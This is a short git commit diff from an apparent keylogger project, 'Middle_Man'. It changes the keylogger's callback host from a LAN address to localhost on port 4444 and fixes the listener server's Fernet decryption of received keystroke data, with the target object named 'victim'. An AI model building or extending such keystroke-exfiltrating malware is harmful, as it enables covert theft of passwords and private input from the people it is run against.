5a8e4bfd03318ea7b24c4603e4cb590e00ef2e64
PheakTra000 <tralegendary99@gmail.com>
2025-12-13 18:34:36 +0700

    implement fernet to key logger

--- Middle_Man/keylogger.py
+++ Middle_Man/keylogger.py
@@ -63,7 +63,7 @@ class Keylogger():
 
 if __name__ == '__main__':
 	
-	Host = "192.168.1.20"
+	Host = "localhost"
 	Port = 4444
 	victim = Keylogger(Host, Port)
 
--- Middle_Man/server.py
+++ Middle_Man/server.py
@@ -25,7 +25,7 @@ class Server():
                
                # decode_msg = data.decode('utf-8')
                print(f'Raw data {data}')
-               decode_msg = data.decrypt(data).decode()
+               decode_msg = crypt.decrypt(data).decode('utf-8')
 
                print(f"{decode_msg}", end='')
 
